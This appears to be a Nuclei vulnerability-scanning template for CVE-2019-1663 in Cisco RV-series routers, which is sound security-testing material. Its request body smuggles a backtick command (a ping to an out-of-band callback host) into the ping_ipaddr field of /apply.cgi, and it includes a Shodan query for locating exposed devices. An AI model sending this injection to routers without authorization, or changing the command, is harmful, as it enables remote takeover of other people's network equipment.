id: cve-2019-1663-cisco-rv-rce

info:
  name: Cisco RV110W / RV130W / RV215W â€” Unauthenticated RCE via command injection (CVE-2019-1663)
  author: ritwickrajmakhal
  severity: critical
  description: |
    Cisco RV110W Wireless-N VPN Firewall, RV130W Wireless-N Multifunction VPN Router, and RV215W Wireless-N VPN Router versions prior to 1.2.2.1, 1.0.3.45, and 1.3.1.1 respectively, contain a command injection caused by improper validation of user-supplied data in the web-based management interface, letting unauthenticated remote attackers execute arbitrary code, exploit requires sending malicious HTTP requests.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-1663
    - http://www.rapid7.com/db/modules/exploit/linux/http/cisco_rv130_rmi_rce
    - https://www.exploit-db.com/exploits/46705/
    - https://github.com/WolffCorentin/CVE-2019-1663-Binary-Analysis
    - https://github.com/StealYourCode/CVE-2019-1663
  classification:
    cve-id: CVE-2019-1663
    cwe-id: CWE-78
  metadata:
    product: Cisco RV110W/RV130W/RV215W
    vendor: Cisco
    shodan-query: 'http.favicon.hash:"-646322113"'
    verified: true
    kev: true
  tags: cve,cisco,router,rv110w,rv130w,rv215w,rce,oast,command-injection

http:
  - method: POST
    path:
      - "{{BaseURL}}/apply.cgi"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      submit_button=Diagnostics&change_action=gozila_cgi&action=Apply&submit_type=ping&commit=1&ping_size=64&ping_times=1&ping_timeout=2&ping_ipaddr=%60ping%20-c%201%20{{interactsh-url}}%60

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "contains(tolower(header), 'mini_httpd') || contains(tolower(body), 'rv130w') || contains(tolower(body), 'rv110w') || contains(tolower(body), 'rv215w') || mmh3('-646322113')"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or

    extractors:
      - type: regex
        part: body
        name: ui-hints
        regex:
          - "(?i)rv(110|130|215)w"
      - type: dsl
        name: interactsh-id
        dsl:
          - "interactsh_request_url"
